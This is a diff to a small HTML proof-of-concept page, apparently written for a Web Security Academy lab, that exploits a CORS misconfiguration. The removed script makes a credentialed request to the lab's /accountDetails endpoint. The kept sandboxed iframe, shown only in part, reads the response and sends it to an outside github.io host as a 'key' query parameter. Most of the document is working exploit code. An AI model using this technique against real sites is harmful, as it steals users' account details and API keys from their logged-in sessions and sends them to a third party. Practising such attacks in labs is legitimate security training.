@@ -1,18 +1,7 @@
 <!doctype html>
 <html>
   <title>CORS POC</title>
-<script>function cors() {
-             var xhr = new XMLHttpRequest();
-             xhr.onreadystatechange = function() {
-                 if (this.readyState == 4 && this.status == 200) {
-                 document.getElementById("demo").innerHTML = alert(this.responseText);
-                 }
-             };
-              xhr.open("GET",
-                       "https://https://0ab8003c0459a6068f2cda9e0078009b.web-security-academy.net/accountDetails", true);
-             xhr.withCredentials = true;
-             xhr.send();
-             }</script>
+<body>
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
     var req = new XMLHttpRequest();
     req.onload = reqListener;
@@ -23,4 +12,5 @@
         location='https://verdecard2023.github.io/mendeleeano.github.io/?key='+encodeURIComponent(this.responseText);
     };
 </script>"></iframe>
+</body>
 </html>
